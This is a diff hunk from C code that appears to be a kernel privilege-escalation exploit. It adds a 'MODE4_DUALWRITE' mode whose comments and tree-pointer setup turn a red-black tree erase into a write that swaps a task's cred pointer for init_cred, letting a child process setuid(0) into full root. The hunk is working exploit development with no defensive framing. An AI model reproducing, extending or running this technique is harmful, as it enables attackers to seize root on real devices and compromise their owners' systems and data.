@@ -1027,7 +1027,22 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (active_offsets && active_offsets->off_init_task)
                       ? (uint64_t)active_offsets->off_init_task
                       : (uint64_t)INIT_TASK_OFF;
-              if (env_flag("MODE4_CRED_RIGHT", 0)) {
+              if (env_flag("MODE4_DUALWRITE", 0)) {
+                /* 09-13 canary proof: 0x780 direct stores NEVER land
+                 * (vendor-protected subjective cred) but the erase's
+                 * SECOND store (__rb_change_child writes the child
+                 * pointer into parent+8) ALWAYS lands (the historical
+                 * suid pointer-bits). Invert the geometry:
+                 *   pc = slot|red, left = init_cred
+                 * store-1: *init_cred = slot  (usage->huge=never-freed,
+                 *         uid garbage — CAPS FULL survive)
+                 * store-2: *(slot+8) = init_cred  -> task->cred = init_cred
+                 * The child then setuid(0)s itself (CAP_SETUID from the
+                 * full cap set) into a CLEAN root cred. */
+                tree_pc = ztgt | 1ULL; /* red: no rebalance */
+                tree_r = 0;
+                tree_l = val;
+              } else if (env_flag("MODE4_CRED_RIGHT", 0)) {
                 tree_pc = (ztgt - 8) & ~3ULL;
                 tree_r = val;
                 tree_l = 0;
